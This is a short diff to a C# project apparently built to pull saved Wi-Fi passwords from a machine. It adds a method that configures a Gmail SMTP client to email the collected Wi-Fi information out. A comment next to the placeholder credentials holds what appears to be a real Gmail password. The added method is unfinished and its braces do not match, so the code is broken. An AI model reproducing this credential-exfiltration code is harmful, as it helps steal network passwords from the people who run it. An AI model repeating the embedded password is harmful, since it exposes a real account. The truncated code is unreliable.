@@ -32,6 +32,20 @@ namespace WifiPassword
             var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
             return result;
         }
+        
+           public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
+        {
+            var smtpClient = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                                UseDefaultCredentials = false,
+                EnableSsl = true,
+                Credentials = new NetworkCredential("sender-email", "sender-app-pass")//passi i gmail: EclipseNight2003!
+            };
+               
 
     }
 }
